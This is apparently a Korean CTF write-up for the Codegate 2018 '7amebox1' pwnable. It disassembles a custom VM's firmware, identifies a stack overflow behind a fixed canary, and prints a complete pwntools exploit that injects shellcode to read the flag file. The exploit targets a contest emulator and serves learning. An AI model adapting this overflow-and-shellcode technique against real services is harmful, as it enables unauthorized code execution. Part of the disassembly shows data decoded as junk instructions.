---
layout:     post
title:      "Codegate 2018 7amebox1 write-up"
subtitle:   "codegate 2018 prequals pwnable"
date:       2018-02-15
author:     "NextLine"
header-img: "img/post-bg-3.png"
tags:
    - WriteUp
---

# Codegate 2018 7amebox1 write-up

### 1. intro

vm문제라서 겁먹고 안봤는데 막상 풀어보니 어렵지 않았다.

### 2. Binary

```
_7amebox.py - 에뮬레이터
flag
mic_check.firm
vm_name.py - pow와 에뮬레이터 설정코드
```

파일은 위처럼 4개로 이루어져 있다. firm파일을 분석하기 위해서 _7amebox.py소스를 이용해 디스어셈블러랑 디버거를 제작했다.

[7dbg.py](https://github.com/LYoungJoo/lyoungjoo.github.io/blob/master/img/in-post/7amebox/7dbg.py)

[7disassembler.py](https://github.com/LYoungJoo/lyoungjoo.github.io/blob/master/img/in-post/7amebox/7disassembler.py)



### 3. Vulnerability

```asm
_start:
   0x0 : call 0x9
   0x5 : xor   r0, r0
   0x7 : syscall
sub_9 :
   0x9 : push   bp
   0xb : mov   bp, sp
   0xd : sub   sp, 0x3c
   0x12 : mov   r5, bp
   0x14 : sub   r5, 0x3
   0x19 : mov   r6, 0x12345
   0x1e : mov   [r5], r6
   0x20 : mov   r0, 0xcd
   0x25 : call 0x90
   0x2a : mov   r1, 0x42
   0x2f : mov   r5, bp
   0x31 : sub   r5, 0x3c
   0x36 : mov   r0, r5
   0x38 : call 0x60
   0x3d : mov   r0, 0xd3
   0x42 : call 0x90
   0x47 : mov   r5, bp
   0x49 : sub   r5, 0x3
   0x4e : mov   r6, [r5]
   0x50 : cmp   r6, 0x12345
   0x55 : jmpif(!ZF) 0x5
   0x5a : mov   sp, bp
   0x5c : pop   bp
   0x5e : ret
sub_60 :
   0x60 : mov   r3, r1
   0x62 : mov   r2, r0
   0x64 : mov   r1, 0x0
   0x69 : mov   r0, 0x3
   0x6e : syscall
   0x70 : ret
sub_72 :
   0x72 : push   r1
   0x74 : push   r2
   0x76 : push   r3
   0x78 : mov   r3, r1
   0x7a : mov   r2, r0
   0x7c : mov   r1, 0x1
   0x81 : mov   r0, 0x2
   0x86 : syscall
   0x88 : pop   r3
   0x8a : pop   r2
   0x8c : pop   r1
   0x8e : ret
sub_90 :
   0x90 : push   r0
   0x92 : push   r1
   0x94 : mov   r1, r0
   0x96 : call 0xa8
   0x9b : xchg   r0, r1
   0x9d : call 0x72
   0xa2 : pop   r1
   0xa4 : pop   r0
   0xa6 : ret
sub_a8 :
   0xa8 : push   r1
   0xaa : push   r2
   0xac : xor   r1, r1
   0xae : xor   r2, r2
   0xb0 : movb   r2, [r0]
   0xb2 : cmpb   r2, 0x0
   0xb7 : jmpif(ZF) 0xc5
   0xbc : inc   r0
   0xbe : inc   r1
   0xc0 : jmp 0xb0
   0xc5 : mov   r0, r1
   0xc7 : pop   r2
   0xc9 : pop   r1
   0xcb : ret
sub_cd :
   0xcd : jmpif(ZF)   r6, 0x195f6d
   0xd2 : mov   r6, [r2]
   0xd4 : call   eflags, r5
```

위 코드를 보면 overflow가 발생하는데, 메모리에서 0x12345를 확인한다. 즉 canary가 0x12345고 bof취약점이 있는 바이너리라고 보고 exploit 했다.



### 4. Exploit

```python
from pwn import *
import random
from hashlib import sha1

def p21(data):
	p21_data = chr(data & 0b000000000000001111111)
	p21_data += chr((data & 0b111111100000000000000) >> 14)
	p21_data += chr((data & 0b000000011111110000000) >> 7)
	return p21_data

def merge_p7(p7s):
	p21_data = 0
	p21_data |= p7s[2]
	p21_data |= p7s[0] << 7
	p21_data |= p7s[1] << 14
	return p21_data

def p14(data):
	p14_data = chr((data & 0b11111110000000) >> 7)
	p14_data += chr(data & 0b00000001111111)
	return p14_data

def asm7(op,opers,optype):
	asm = 0
	asm |= (op << 9)
	asm |= (optype << 8)
	
	if optype == 0: # op_type R
		asm |= (opers[0] << 4)
		asm |= (opers[1])
		return p14(asm)

	elif optype == 1: # op_type I
		asm |= (opers[0] << 4)		
		asm = p14(asm)
		asm += p21(opers[1])
		return asm

s = process('./vm_name.py')

## proof of work ##
s.recvuntil('prefix : ')
fix = s.recvline()[:-1]
for i in range(0x1000000):
	random_value = str(random.random())
	if sha1(fix + random_value).hexdigest()[-6:] == '000000':
		answer = fix + random_value
		break

s.sendline(answer)

payload = p21(0x0) * 19 + p21(0x12345) + p21(0) + p21(0xf5f9e)
flag = 0xf5fda
payload = asm7(6,[0,0x67],1)	# push g
payload += asm7(6,[0,merge_p7([0x61,0x6c,0x66])],1) # push alf

payload += asm7(4,[0,1],1)		# mov r0, 1 
payload += asm7(4,[1,flag],1)	# mov r1, flag
payload += asm7(8,[0,0],0)		# syscall ; open('flag') 
payload += asm7(4,[0,3],1)		# mov r0, 3
payload += asm7(4,[1,2],1)		# mov r1, 2
payload += asm7(4,[2,flag-50],1)# mov r2, (flag-30)
payload += asm7(4,[3,30],1)		# mov r3, 30
payload += asm7(8,[0,0],0)		# syscall ; read(2,flag-50,30)
payload += asm7(4,[0,2],1)		# mov r0, 2
payload += asm7(18,[1,0],0)		# dec r1
payload += asm7(8,[0,0],0)		# syscall ; write(1,flag-50,30)

payload += '\x00' * (57-len(payload)) + p21(0x12345) + p21(0) + p21(0xf5f9e) 
s.sendline(payload)
s.interactive()
```
